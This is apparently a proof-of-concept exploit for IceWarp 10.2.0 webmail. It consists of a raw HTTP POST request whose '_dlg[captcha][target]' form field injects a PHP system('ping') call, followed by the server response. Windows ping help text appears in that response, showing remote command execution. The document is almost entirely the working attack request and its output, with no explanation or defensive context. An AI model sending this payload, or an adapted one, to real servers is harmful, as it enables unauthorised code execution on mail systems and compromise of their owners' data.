

```
POST /webmail/basic/ HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
Cookie: use_cookies=1
Content-Length: 39

_dlg[captcha][target]=system(\'ping\')\
```

RESPONSE:

```
HTTP/1.1 302 Moved Temporarily
Connection: close
Server: IceWarp/10.2.0
Date: Fri, 18 Jun 2021 05:58:58 GMT
Set-Cookie: use_cookies=1
Set-Cookie: PHPSESSID_BASIC=11112262a674b6d2ad00bdd41f0cc6dd; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Location: http://123123123123/webmail/?_n[p][main]=win.login&eid=a60cc3622136b80079550001623995938&_s[action]=error
Content-type: text/html

Usage: ping [-t] [-a] [-n count] [-l size] [-f] [-i TTL] [-v TOS]
            [-r count] [-s count] [[-j host-list] | [-k host-list]]
            [-w timeout] [-R] [-S srcaddr] [-4] [-6] target_name
Options:
    -t             Ping the specified host until stopped.
                   To see statistics and continue - type Control-Break;
                   To stop - type Control-C.
    -a             Resolve addresses to hostnames.
    -n count       Number of echo requests to send.
    -l size        Send buffer size.
    -f             Set Don't Fragment flag in packet (IPv4-only).
    -i TTL         Time To Live.
    -v TOS         Type Of Service (IPv4-only).
    -r count       Record route for count hops (IPv4-only).
    -s count       Timestamp for count hops (IPv4-only).
    -j host-list   Loose source route along host-list (IPv4-only).
    -k host-list   Strict source route along host-list (IPv4-only).
    -w timeout     Timeout in milliseconds to wait for each reply.
    -R             Trace round-trip path (IPv6-only).
    -S srcaddr     Source address to use (IPv6-only).
    -4             Force using IPv4.
    -6             Force using IPv6.
```